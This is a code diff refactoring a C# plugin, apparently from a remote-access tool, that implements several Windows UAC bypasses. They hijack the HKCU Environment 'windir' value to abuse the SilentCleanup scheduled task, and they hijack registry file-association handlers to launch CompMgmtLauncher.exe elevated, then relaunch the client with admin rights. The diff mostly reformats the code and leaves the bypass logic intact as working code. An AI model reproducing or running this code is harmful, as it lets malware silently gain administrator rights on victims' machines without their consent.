@@ -1,14 +1,8 @@
-﻿using Microsoft.Win32;
-using System;
-using System.Collections.Generic;
+﻿using System;
 using System.Diagnostics;
-using System.IO;
-using System.Linq;
 using System.Runtime.InteropServices;
-using System.Security.Cryptography.X509Certificates;
-using System.Text;
 using System.Threading;
-using System.Windows.Forms;
+using Microsoft.Win32;
 
 namespace Plugin.Handler
 {
@@ -17,10 +11,10 @@ namespace Plugin.Handler
         public HandleUAC()
         {
             if (Methods.IsAdmin()) return;
-  
+
             try
             {
-                Process proc = new Process
+                var proc = new Process
                 {
                     StartInfo = new ProcessStartInfo
                     {
@@ -35,11 +29,12 @@ namespace Plugin.Handler
                 Methods.ClientExit();
                 Environment.Exit(0);
             }
-            catch{}
+            catch
+            {
+            }
         }
-
-
     }
+
     public class HandleUACbypass
     {
         public HandleUACbypass()
@@ -48,33 +43,29 @@ namespace Plugin.Handler
 
             try
             {
-                Microsoft.Win32.RegistryKey key;
-                key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Environment");
-                key.SetValue("windir", @"cmd.exe " + @"/k START " + Process.GetCurrentProcess().MainModule.FileName + " & EXIT");
+                RegistryKey key;
+                key = Registry.CurrentUser.CreateSubKey("Environment");
+                key.SetValue("windir",
+                    @"cmd.exe " + @"/k START " + Process.GetCurrentProcess().MainModule.FileName + " & EXIT");
                 key.Close();
 
-                Process process = new Process();
+                var process = new Process();
                 process.StartInfo.FileName = "schtasks.exe";
                 process.StartInfo.Arguments = "/run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I";
                 process.Start();
-                
+
                 Methods.ClientExit();
                 Environment.Exit(0);
             }
-            catch{}
+            catch
+            {
+            }
         }
-
-
     }
 
-    
+
     public class HandleUACbypass2
     {
-
-        [DllImport("kernel32.dll")]
-        public static extern int WinExec(string exeName, int operType);
-
-
         public HandleUACbypass2()
         {
             if (Methods.IsAdmin()) return;
@@ -90,11 +81,10 @@ namespace Plugin.Handler
                 key.Close();
 
 
-
                 var system = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
                 var filePath = system + @"\System32\CompMgmtLauncher.exe";
                 WinExec(@"cmd.exe /k START " + filePath, 0);
-                Thread.Sleep(0);                
+                Thread.Sleep(0);
 
                 //Registry.CurrentUser.OpenSubKey("Software", true).OpenSubKey("Classes", true).DeleteSubKeyTree("mscfile");
                 Thread.Sleep(1000);
@@ -107,17 +97,14 @@ namespace Plugin.Handler
             }
         }
 
-
+        [DllImport("kernel32.dll")]
+        public static extern int WinExec(string exeName, int operType);
     }
 
     public class HandleUACbypass3
     {
-        [DllImport("kernel32.dll")]
-        public static extern int WinExec(string exeName, int operType);
-
         public HandleUACbypass3()
         {
-            
             if (Methods.IsAdmin()) return;
 
             try
@@ -138,7 +125,7 @@ namespace Plugin.Handler
                 Thread.Sleep(0);
 
                 //Registry.CurrentUser.OpenSubKey("Software", true).OpenSubKey("Classes", true).DeleteSubKeyTree("ms-settings");
-                
+
                 Methods.ClientExit();
                 Environment.Exit(0);
             }
@@ -147,5 +134,8 @@ namespace Plugin.Handler
                 Packet.Error(ex.Message);
             }
         }
-    }    
+
+        [DllImport("kernel32.dll")]
+        public static extern int WinExec(string exeName, int operType);
+    }
 }
